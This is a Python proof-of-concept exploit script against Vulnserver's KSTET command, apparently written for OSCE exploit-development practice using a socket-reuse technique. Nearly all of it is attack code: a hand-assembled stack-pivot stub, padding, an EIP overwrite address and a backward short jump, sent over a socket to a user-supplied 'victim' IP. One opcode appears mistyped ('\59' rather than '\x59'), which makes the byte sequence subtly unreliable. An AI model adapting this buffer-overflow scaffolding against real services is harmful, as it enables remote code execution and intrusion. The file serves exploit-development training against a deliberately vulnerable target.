#!/usr/bin/env python3
print ("# #########################################")
print ("#  POC KSTET instruction | Vulnserver  ####")
print ("#     Practice OSCE | Exploit Dev      ####")
print ("#           Exploit By r0r0x_xxx       ####")
print ("#           Date: 29-10-2020 	       ####")
print ("#             Socket Reuse   	       ####")
print ("###########################################")

#Banner

print (" _    _                         _    _            _    _             ")
print ("| |  | |                       | |  | |          | |  (_)            ")
print ("| |__| | __ _ _ __  _ __  _   _| |__| | __ _  ___| | ___ _ __   __ _ ")
print ("|  __  |/ _` | '_ \| '_ \| | | |  __  |/ _` |/ __| |/ / | '_ \ / _` |")
print ("| |  | | (_| | |_) | |_) | |_| | |  | | (_| | (__|   <| | | | | (_| |")
print ("|_|  |_|\__,_| .__/| .__/ \__, |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |")
print ("             | |   | |     __/ |                                __/ |")
print ("             |_|   |_|    |___/                                |___/ ")

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from sys import exit

timeout_val = 5 # Seconds
host = input("Enter the victim ip address: ")
port = input("Enter the remote port of the victim: ")
victim = ((host, int(port)))

#Identifying the WS2_32.recv function
#00401953  |. E8 D40B0000    |CALL <JMP.&WS2_32.recv>                 ; \recv
#CALL 0040252C
#Address Descriptor 00BBFB93 - Address socket in stack 00BBFA0C = HEX 187 or DEC 391 

#usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#asm > PUSH ESP
#00000000  54                push esp
#nasm > POP ECX
#00000000  59                pop ecx
#nasm > ADD CX, 0x187
#00000000  6681C18701        add cx,0x187
#add cx,0x187 = 6681C18701 = \x66\x81\xC1\x87\x01

payload = ( 
	b"\x54" #PUSH ESP
	b"\59" # POP ECX
	b"\x66\x81\xC1\x87\x01" #ADD CX,187
)
payload += b"\xCC" * (66 - len(payload))   #EIP 41326341
payload += b"\xAF\x11\x50\x62"
payload += b"\xEB\xB8" #JMP SHORT - 72bytes
payload += b"\x90" * 25

buff = b"KSTET /.:/"
buff += payload

if __name__ == '__main__':
    print('[*] creating the socket :D')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the Windows VM')
        s.connect(victim)
        print('[*] sending BOMB...')
        s.send(buff)
        print('[*] Chao')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, Check the application dude?')
        print('\Check the debugger')
        exit(1)
    except error:
        print('[!] The socket does not work, Dude wake up')
        exit(1)


